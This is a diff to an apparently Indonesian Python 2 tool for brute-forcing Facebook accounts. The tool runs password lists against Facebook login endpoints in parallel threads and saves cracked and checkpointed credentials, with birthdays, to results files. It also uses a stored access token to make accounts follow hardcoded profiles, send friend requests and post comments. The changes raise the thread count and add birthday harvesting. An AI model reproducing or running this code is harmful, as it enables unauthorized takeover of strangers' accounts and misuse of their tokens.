@@ -196,7 +196,7 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
         elif yan =='4':
                 postingan()
         elif yan =='5':
-                __crack__().slurr()
+                __crack__().plerr()
         elif yan =='6':
         	jalan('\n note! ketik %suser%s jika anda ingin mendapatkan id dari username'%(H,N));time.sleep(0.07)
         	cek_ingfo()
@@ -260,7 +260,6 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
-	requests.post('https://graph.facebook.com/100008574165337/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,__cindy__,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
@@ -630,7 +629,7 @@ class __crack__:
     def __init__(self):
         self.fl = []
 
-    def slurr(self):
+    def plerr(self):
         try:
             self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
             self.id = open(self.apk).read().splitlines()
@@ -640,16 +639,17 @@ class __crack__:
             time.sleep(3)
             moch_yayan()
 
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
-            print '\n [*] contoh: %s[ %ssayang,anjing,bangsat%s ]'%(N,H,N)
+            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                 print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                 if pwek == '':
-                    self.slurr()
+                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
+                elif len(pwek)<=5:
+                	print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
-                	
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
@@ -712,7 +712,6 @@ class __crack__:
                     print ' [%s3%s]. method mobile (super slow)'%(O,N)
                     __yan__(pwek.split(','))
                     break
-
         elif ___yayanganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
             print ' [%s1%s]. method API (fast)'%(O,N)
@@ -756,15 +755,20 @@ class __crack__:
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
-                    __cindy__ = open('__yayan__.txt','r').read()
+                    __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
                     ttl= az['birthday']
+                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
+                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
-                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
+                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -802,15 +806,20 @@ class __crack__:
                 continue
             if 'checkpoint' in xo:
                 try:
-                    __cindy__ = open('__yayan__.txt','r').read()
+                    __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
                     ttl= az['birthday']
+                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
+                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
-                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
+                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -851,15 +860,20 @@ class __crack__:
                 continue
             elif 'checkpoint' in ses.cookies.get_dict().keys():
             	try:
-                    __cindy__ = open('__yayan__.txt','r').read()
+                    __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
                     ttl= az['birthday']
+                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
+                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
-                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
+                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -875,7 +889,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=20) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         bb = yntks.split('<=>')
@@ -913,14 +927,14 @@ class __crack__:
                         pass
 
             print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
-            os.remove(self.apk)
+           # os.remove(self.apk)
             hasil(ok,cp)
             exit()
         elif yan in ('2', '02'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=20) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         bb = yntks.split('<=>')
@@ -965,7 +979,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=20) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         bb = yntks.split('<=>')
